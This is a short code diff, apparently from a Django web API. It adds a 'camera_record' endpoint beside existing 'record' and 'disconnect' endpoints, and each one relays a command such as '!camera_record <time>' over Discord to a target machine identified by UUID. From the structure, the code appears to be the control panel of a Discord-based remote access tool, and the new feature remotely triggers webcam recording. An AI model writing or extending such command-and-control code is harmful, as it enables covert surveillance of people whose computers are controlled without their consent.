@@ -192,6 +192,12 @@ def record(request, target_uuid, record_time):
     return JsonResponse({'channel': target_uuid, 'command': command}, safe=False)
 
 @api_view(['GET'])
+def camera_record(request, target_uuid, record_time):
+    command = f"!camera_record {record_time}"
+    __send_discord_command(target_uuid, command)
+    return JsonResponse({'channel': target_uuid, 'command': command}, safe=False)
+
+@api_view(['GET'])
 def disconnect(request, target_uuid):
     command = "!disconnect"
     __send_discord_command(target_uuid, command)
